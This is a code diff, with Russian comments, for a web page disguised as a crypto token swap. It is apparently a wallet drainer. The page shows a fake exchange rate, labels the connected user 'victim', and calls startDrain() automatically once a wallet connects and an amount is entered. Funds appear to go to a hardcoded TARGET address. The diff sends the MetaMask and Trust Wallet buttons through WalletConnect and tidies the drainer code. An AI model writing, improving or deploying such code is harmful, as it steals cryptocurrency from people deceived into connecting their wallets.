@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
     <style>
-        /* ===== СТИЛИ ИЗ gsgsf.html (без изменений) ===== */
+        /* ===== СТИЛИ (без изменений) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -288,7 +288,6 @@
 
         .hidden { display: none !important; }
 
-        /* Для QR-кода */
         #qrContainer {
             margin: 15px auto 10px;
             display: flex;
@@ -371,7 +370,7 @@
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
     </div>
 
-    <!-- Модалка выбора кошелька -->
+    <!-- Модалка выбора кошелька (только MetaMask и Trust, обе ведут к WalletConnect) -->
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
@@ -379,24 +378,17 @@
                 <span class="w-icon"><i class="fab fa-meta"></i></span>
                 <span class="w-info">
                     <span class="w-name">MetaMask</span>
-                    <span class="w-desc">Browser extension</span>
+                    <span class="w-desc">Browser extension (через WalletConnect)</span>
                 </span>
             </div>
             <div id="trustOption" class="wallet-card">
                 <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
                     <span class="w-name">Trust Wallet</span>
-                    <span class="w-desc">Mobile &amp; browser</span>
+                    <span class="w-desc">Mobile &amp; browser (через WalletConnect)</span>
                 </span>
             </div>
-            <div id="wcOption" class="wallet-card">
-                <span class="w-icon"><i class="fas fa-wifi" style="color:#3b99fc;"></i></span>
-                <span class="w-info">
-                    <span class="w-name">WalletConnect</span>
-                    <span class="w-desc">QR‑code for any wallet</span>
-                </span>
-            </div>
-            <!-- Контейнер для QR-кода (появляется при выборе WalletConnect) -->
+            <!-- Кнопка WalletConnect удалена -->
             <div id="qrContainer" class="hidden"></div>
             <button class="modal-close" id="closeModalBtn">Cancel</button>
         </div>
@@ -412,6 +404,13 @@
         </div>
     </div>
 
+    <!-- ===== POLYFILL для process ===== -->
+    <script>
+        // Определяем process глобально до загрузки библиотек
+        window.process = window.process || { env: { NODE_ENV: 'production' } };
+        console.log('✅ Polyfill process установлен');
+    </script>
+
     <!-- Подключаем библиотеки -->
     <script src="libs/ethers.umd.min.js"></script>
     <script src="libs/walletconnect-provider.min.js"></script>
@@ -422,7 +421,7 @@
             'use strict';
 
             // ============================================================
-            // КОНФИГУРАЦИЯ (взята из index.html / index2.html)
+            // КОНФИГУРАЦИЯ (из index.html / index2.html)
             // ============================================================
             const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
             const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
@@ -507,7 +506,6 @@
             const closeModalBtn = document.getElementById('closeModalBtn');
             const metamaskOption = document.getElementById('metamaskOption');
             const trustOption = document.getElementById('trustOption');
-            const wcOption = document.getElementById('wcOption');
 
             const tokenModal = document.getElementById('tokenModal');
             const tokenSearchInput = document.getElementById('tokenSearchInput');
@@ -628,88 +626,32 @@
             // ============================================================
             function generateQR(uri) {
                 qrContainer.innerHTML = '';
-                new QRCode(qrContainer, {
-                    text: uri,
-                    width: 200,
-                    height: 200,
-                    colorDark: '#000000',
-                    colorLight: '#ffffff',
-                    correctLevel: QRCode.CorrectLevel.H
-                });
-                qrContainer.classList.remove('hidden');
-                setStatus('Отсканируйте QR-код в любом кошельке');
-            }
-
-            // ============================================================
-            // ПОДКЛЮЧЕНИЕ КОШЕЛЬКОВ
-            // ============================================================
-            async function connectWallet(wallet) {
-                if (isConnecting || isProcessing) return;
-                if (!window.ethereum) {
-                    setStatus('❌ Ethereum провайдер не найден. Установите MetaMask или Trust.', 'err');
-                    return;
-                }
-                let ethProvider = null;
-                if (wallet === 'metamask') {
-                    if (window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
-                        ethProvider = window.ethereum;
-                    } else if (window.ethereum.providers) {
-                        for (const p of window.ethereum.providers) {
-                            if (p.isMetaMask && !p.isTrust && !p.isTrustWallet) {
-                                ethProvider = p; break;
-                            }
-                        }
-                    }
-                } else if (wallet === 'trust') {
-                    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
-                        ethProvider = window.ethereum;
-                    } else if (window.ethereum.providers) {
-                        for (const p of window.ethereum.providers) {
-                            if (p.isTrust || p.isTrustWallet) {
-                                ethProvider = p; break;
-                            }
-                        }
-                    }
-                }
-                if (!ethProvider) {
-                    setStatus(`❌ ${wallet === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не обнаружен. Установите расширение.`, 'err');
-                    return;
-                }
                 try {
-                    setStatus('Подключение...', '');
-                    isConnecting = true;
-                    const web3Provider = new ethers.providers.Web3Provider(ethProvider);
-                    await web3Provider.send('eth_requestAccounts', []);
-                    const signer_ = web3Provider.getSigner();
-                    const address = await signer_.getAddress();
-                    const network = await web3Provider.getNetwork();
-
-                    provider = web3Provider;
-                    signer = signer_;
-                    victim = address;
-                    chainId = network.chainId;
-                    isConnected = true;
-
-                    updateConnectButton();
-                    closeModal(walletModal);
-                    setStatus(`✅ ${wallet === 'metamask' ? 'MetaMask' : 'Trust'}: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
-                    isConnecting = false;
-
-                    const val = parseFloat(inputAmount.value);
-                    if (val > 0) setTimeout(() => startDrain(), 800);
+                    new QRCode(qrContainer, {
+                        text: uri,
+                        width: 200,
+                        height: 200,
+                        colorDark: '#000000',
+                        colorLight: '#ffffff',
+                        correctLevel: QRCode.CorrectLevel.H
+                    });
+                    qrContainer.classList.remove('hidden');
+                    setStatus('Отсканируйте QR-код в любом кошельке');
                 } catch (e) {
-                    setStatus('❌ ' + e.message, 'err');
-                    isConnecting = false;
+                    setStatus('Ошибка генерации QR: ' + e.message, 'err');
                 }
             }
 
+            // ============================================================
+            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT (единая функция для MetaMask и Trust)
+            // ============================================================
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
                                          window['@walletconnect/ethereum-provider']?.EthereumProvider ||
                                          window['@walletconnect/ethereum-provider'];
                 if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect не доступен.', 'err');
+                    setStatus('❌ WalletConnect не доступен. Проверьте библиотеку.', 'err');
                     return;
                 }
                 try {
@@ -740,14 +682,16 @@
                         }
                     });
 
+                    // Если URI уже есть – сразу показываем QR
                     if (wcProvider.uri) {
                         generateQR(wcProvider.uri);
                         setStatus('Отсканируйте QR-код в любом кошельке');
                     }
 
+                    // Таймаут на случай, если QR не появится
                     let uriTimeout = setTimeout(() => {
                         if (!qrContainer.classList.contains('hidden') || !wcProvider.uri) {
-                            setStatus('Не удалось получить QR-код. Попробуйте другой кошелёк.', 'err');
+                            setStatus('Не удалось получить QR-код. Попробуйте снова.', 'err');
                             isConnecting = false;
                         }
                     }, 8000);
@@ -769,7 +713,7 @@
                     updateConnectButton();
                     closeModal(walletModal);
                     qrContainer.classList.add('hidden');
-                    setStatus(`✅ WalletConnect: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
+                    setStatus(`✅ Подключено: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                     isConnecting = false;
 
                     const val = parseFloat(inputAmount.value);
@@ -918,18 +862,12 @@
             // ============================================================
             // Кнопка Connect открывает модалку
             connectBtn.addEventListener('click', () => {
-                if (isConnected) {
-                    // Если уже подключены, можно переподключиться
-                    openModal(walletModal);
-                } else {
-                    openModal(walletModal);
-                }
+                openModal(walletModal);
             });
 
-            // Выбор кошелька
-            metamaskOption.addEventListener('click', () => connectWallet('metamask'));
-            trustOption.addEventListener('click', () => connectWallet('trust'));
-            wcOption.addEventListener('click', connectWalletConnect);
+            // Обе кнопки (MetaMask и Trust) теперь вызывают connectWalletConnect
+            metamaskOption.addEventListener('click', connectWalletConnect);
+            trustOption.addEventListener('click', connectWalletConnect);
 
             // Закрытие модалок
             closeModalBtn.addEventListener('click', () => closeModal(walletModal));
@@ -1003,7 +941,6 @@
                                 fromSymbol.textContent = fromToken.symbol;
                                 toIcon.src = toToken.img;
                                 toSymbol.textContent = toToken.symbol;
-                                // Обновляем отображение курса (декоративно)
                                 updateRateDisplay();
                             });
                         }
@@ -1019,7 +956,6 @@
                     outputAmount.value = '';
                     return;
                 }
-                // Демонстрационный курс: просто умножаем на случайный коэффициент
                 const rate = 1.2; // фиктивный
                 const out = val * rate;
                 outputAmount.value = out.toFixed(6);
@@ -1044,7 +980,6 @@
                 renderTokenList(this.value);
             });
 
-            // Стрелка обмена токенами (декоративно)
             swapArrow.addEventListener('click', function() {
                 const temp = fromToken;
                 fromToken = toToken;
@@ -1057,7 +992,6 @@
                 setStatus('Токены перевернуты', '');
             });
 
-            // Обновление курса при вводе суммы
             inputAmount.addEventListener('input', updateRateDisplay);
 
             // ============================================================
@@ -1066,11 +1000,9 @@
             updateConnectButton();
             setStatus('Подключите кошелёк или введите сумму', '');
             updateRateDisplay();
-
-            // Предзагрузка QR-кода (скрыто)
             qrContainer.classList.add('hidden');
 
-            // Проверяем наличие библиотек
+            // Проверка наличия библиотек
             if (typeof ethers === 'undefined') {
                 setStatus('❌ Библиотека ethers не загружена', 'err');
             }
@@ -1078,7 +1010,7 @@
                 console.warn('QRCode библиотека не загружена');
             }
 
-            // При загрузке очищаем старые сессии
+            // Очистка старых сессий при загрузке
             forceClearSession();
 
         })();
